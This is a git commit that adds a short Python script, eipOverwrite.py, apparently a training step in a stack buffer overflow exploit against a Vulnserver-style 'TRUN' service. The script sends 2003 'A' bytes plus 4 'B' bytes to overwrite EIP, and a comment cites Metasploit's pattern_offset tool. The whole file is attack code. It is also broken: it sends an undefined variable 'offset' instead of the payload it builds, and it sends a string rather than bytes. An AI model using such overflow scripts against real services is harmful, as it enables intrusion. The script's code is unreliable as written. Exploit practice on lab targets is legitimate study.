43e6338e54396fe8a424a9d3cafa9b9726ca1683
souilos <105228014+souilos@users.noreply.github.com>
2023-02-13 16:45:34 +0100

    Create eipOverwrite.py

---
+++ eipOverwrite.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python3
+import sys, socket
+
+#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
+
+shellcode = "A" * 2003 + "B" * 4
+
+try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.1', 5000)) #CHANGE
+        s.send(('TRUN /.:/' + offset))
+        s.close()
+
+except:
+        print("Error connecting to the server")
+        sys.exit()
